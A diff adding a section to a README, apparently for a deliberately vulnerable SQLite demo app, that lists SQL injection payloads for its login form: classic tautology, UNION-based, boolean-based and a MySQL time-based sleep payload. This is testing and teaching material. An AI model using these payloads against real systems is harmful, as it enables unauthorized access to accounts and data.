@@ -66,3 +66,61 @@ This README provides step-by-step instructions for setting up a Python virtual e
    ```bash
    python init_db.py
    ```
+
+## Testing SQL Injections
+
+### Classic SQL Injection
+
+1. **Username**:
+
+   ```bash
+   ' OR '1'='1
+   ```
+
+2. **Password**:
+   ```bash
+   ' OR '1'='1
+   ```
+
+### Union-based SQL Injection
+
+SQLite doesn't allow multiple statements in a single SQL query, which limits the types of UNION queries you can perform. However, you can still test basic UNION-based SQL injections.
+
+1. **Username**:
+
+   ```bash
+   ' UNION SELECT NULL, 'a', 'b' --
+   ```
+
+2. **Password**:
+   ```bash
+   (Leave it blank)
+   ```
+
+### Boolean-based SQL Injection
+
+1. **Username**:
+
+   ```bash
+   ' OR '1'='1
+   ```
+
+2. **Password**:
+   ```bash
+   ' OR '1'='2
+   ```
+
+### Time-based Blind SQL Injection
+
+SQLite does not have built-in sleep functions, but for databases that do (like MySQL), you could use payloads like:
+
+1. **Username**:
+
+   ```bash
+   ' OR IF('1'='1', sleep(10), 0) --
+   ```
+
+2. **Password**:
+   ```bash
+   (Leave it blank)
+   ```
